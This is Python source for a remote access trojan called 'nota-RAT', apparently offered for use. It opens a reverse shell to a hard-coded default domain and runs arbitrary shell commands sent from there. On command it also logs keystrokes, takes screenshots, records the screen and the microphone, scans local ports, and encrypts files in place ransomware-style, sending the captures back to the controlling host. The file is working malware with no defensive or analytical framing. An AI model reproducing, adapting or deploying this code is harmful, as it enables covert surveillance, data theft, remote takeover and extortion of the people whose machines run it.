import socket
import argparse
import os 
import time
import sys
import subprocess
import numpy as np
import cv2
import pyautogui
import sounddevice as sd
from scipy.io.wavfile import write
import random
import datetime
from threading import Thread
from cryptography.fernet import Fernet
from pynput.keyboard import Key, Listener
from discord_webhook import DiscordWebhook, DiscordEmbed


parser = argparse.ArgumentParser(
    description="nota-RAT, python reverse shell using sockets."
)

parser.add_argument("host", default= "xn--6pw65a019d.xyz", nargs="?", help="Address of the Server.")

parser.add_argument(
    "-p", "--port", default=421, help="Port the Server is running on.", type=int
)

args = parser.parse_args()
SERVER_HOST = args.host
SERVER_PORT = args.port
BUFFER_SIZE = 1024 * 128 
SEPARATOR = "<sep>"
key = b'fXpsGp9mJFfNYCTtGeB2zpY9bzjPAoaC0Fkcc13COy4='
keyz = Fernet.generate_key()
secret_key = keyz


s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))

while True:
    command = s.recv(BUFFER_SIZE).decode()
    if command == "exit":
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        disconnected_msg = " disconnected quietly"
        disconnected_msg = f"\n{IPAddr}{disconnected_msg}"
        s.send(disconnected_msg.encode())
        break
    if command == "start local portscanner":
        port_range = s.recv(BUFFER_SIZE).decode()
        port_range = int(port_range)
        startTime = time.time()
        open_ports = 0
        ports_list = "\nopen_ports\n"

        for i in range(0, port_range):
            hostname = socket.gethostname()
            host = "192.168.3.10"
            port = i
            timeout_seconds = 1
            port_scanner_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            port_scanner_socket.settimeout(timeout_seconds)
            result = port_scanner_socket.connect_ex((host,int(port)))
            if result == 0:
                new_port = ("Host: {}: Port: {}\n".format(host, port))
                ports_list = ports_list + new_port
            else:
                continue
            port_scanner_socket.close()
            open_ports += 1

        ports_list = str(ports_list)
        s.send(ports_list.encode())
        time.sleep(1)
        s.send(("\nOpen ports: " + str(open_ports)).encode())
        executionTime = (time.time() - startTime)
        executionTime = int(executionTime)
        time.sleep(1)
        s.send(('Execution time in seconds: ' + str(executionTime)).encode())
    if command == "start keylogger":
        LOGGER_HOST = args.host
        LOGGER_PORT = 422
        logger = socket.socket()
        logger.connect((LOGGER_HOST, LOGGER_PORT))
        def press(key):
            wordz = []
            wordz.append(key)
            with open("log.txt", "w") as file1:
                file1.writelines(f"\n{wordz}\n")
                
                
        def release(key):
            enc_key = b'fXpsGp9mJFfNYCTtGeB2zpY9bzjPAoaC0Fkcc13COy4='
            if key == Key.space or Key.enter:
                with open("log.txt", "r") as file1:
                    contents = file1.read()
                    date_now = str(datetime.datetime.now())
                    contents = contents + date_now
                    logger.send(contents.encode())
        def keylogger_loop():
            while True:
                if command == "stop keylogger":
                    logger.close()
                    break
                with Listener(
                        on_press=press,
                        on_release=release) as listener:
                    listener.join()
        keyzlogger_loop = Thread(target=keylogger_loop)
        keyzlogger_loop.daemon = True
        keyzlogger_loop.start()
    if command == "take screenshot":
        image = pyautogui.screenshot()
        image = cv2.cvtColor(np.array(image),
                     cv2.COLOR_RGB2BGR)
        cv2.imwrite("screenshot.png", image)
        filename = "screenshot.png"
        if filename in os.listdir():
            with open(filename, "rb") as f:
                data = f.read()
                dataLen = len(data)
                s.send(dataLen.to_bytes(4,'big'))
                s.send(data)
            f.close()
        os.remove("screenshot.png")
    if command == "record screen":
        def screenrecorder():
            time_stop = s.recv(BUFFER_SIZE).decode()
            time_stop = int(time_stop)
            SCREEN_SIZE = (1920, 1080)
            fource = cv2.VideoWriter_fourcc(*'XVID')
            out = cv2.VideoWriter('recording.mp4', fource, 10.0, (SCREEN_SIZE))

            fps = 20
            prev = 0

            start = time.time()

            while True:
                if time.time() > start + time_stop: 
                    cv2.destroyAllWindows()
                    out.release()
                    break
                time_elapsed = time.time()-prev
                img = pyautogui.screenshot()
                if time_elapsed > 1.0/fps:
                    prev = time.time()
                    frame = np.array(img)
                    frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
                    out.write(frame)
            filename = "recording.mp4"
            if filename in os.listdir():
                with open(filename, "rb") as f:
                    data = f.read()
                    dataLen = len(data)
                    s.send(dataLen.to_bytes(4,'big'))
                    s.send(data)
                f.close()
            os.remove("recording.mp4")
        screenrecorderz = Thread(target=screenrecorder)
        screenrecorderz.daemon = True
        screenrecorderz.start()
    if command == "send command":
        cwd = os.getcwd()
        s.send(cwd.encode())
        new_command = s.recv(BUFFER_SIZE).decode()
        print(new_command)
        splited_command = new_command.split()
        if splited_command[0].lower() == "cd":
            try:
                os.chdir(' '.join(splited_command[1:]))
            except FileNotFoundError as e:
                output = str(e)
            else:
                output = ""
        else:
            output = subprocess.getoutput(new_command)
        print(output)
        message = f"{output}{SEPARATOR}{cwd}"
        print(message)
        s.send(message.encode())
    if command == "encrypt files":
        files = []
        for file in os.listdir():
            if file == "log.txt":
                continue
            if file == os.path.basename(__file__):
                continue
            if os.path.isfile(file):
                files.append(file)
        for file in files:
            with open(file, "rb") as thefile:
                contents = thefile.read()
            contents_encrypted = Fernet(keyz).encrypt(contents)
            with open(file, "wb")   as thefile:
                thefile.write(contents_encrypted)
        secret_key = keyz
        s.send("files encrypted successfully".encode())
    if command == "decrypt files":
        for file in files:
            with open(file, "rb") as thefile:
                contents = thefile.read()
            contents_decrypted = Fernet(secret_key).decrypt(contents)
            with open(file, "wb") as thefile:
                thefile.write(contents_decrypted)
        s.send("files decrpyted successfully".encode())
    if command == "record mic":
        fs = 44100
        seconds = s.recv(BUFFER_SIZE).decode()
        seconds = int(seconds)
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()
        write('output.wav', fs, myrecording)
        filename = "output.wav"
        if filename in os.listdir():
            with open(filename, "rb") as f:
                data = f.read()
                dataLen = len(data)
                s.send(dataLen.to_bytes(4,'big'))
                s.send(data)
            f.close()
        os.remove("output.wav")
    
s.close()